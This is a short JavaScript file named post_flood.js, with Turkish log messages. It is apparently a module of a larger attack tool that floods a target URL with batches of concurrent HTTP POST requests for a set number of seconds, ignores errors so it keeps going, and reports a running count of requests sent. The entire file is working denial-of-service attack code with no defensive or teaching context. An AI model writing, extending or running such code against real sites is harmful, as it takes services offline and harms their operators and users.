// post_flood.js
const url = new URL(params.url);
const client = url.protocol === 'https:' ? https : http;
const end = Date.now() + (params.duration * 1000);

const postData = params.data || 'test=123';
const contentType = params.contentType || 'application/x-www-form-urlencoded';

console.log(`[+] POST Flood başladı: ${params.url}`);
console.log(`[+] Veri: ${postData}`);
console.log(`[+] Süre: ${params.duration} saniye`);

let sentCount = 0;

function sendRequest() {
    return new Promise((resolve) => {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': contentType,
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0'
            }
        };
        
        const req = client.request(url, options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {
                sentCount++;
                resolve();
            });
        });
        
        req.on('error', (err) => {
            console.log('[!] Hata:', err.message);
            resolve(); // Hatayı yut, devam et
        });
        
        req.write(postData);
        req.end();
    });
}

async function flood() {
    while (Date.now() < end) {
        // Her seferinde params.requests kadar istek
        const promises = [];
        for (let i = 0; i < params.requests; i++) {
            promises.push(sendRequest());
        }
        await Promise.all(promises);
        
        // Her saniye rapor ver
        console.log(`[+] ${sentCount} istek gönderildi...`);
    }
    
    console.log(`[+] TOPLAM: ${sentCount} istek gönderildi`);
}

flood();
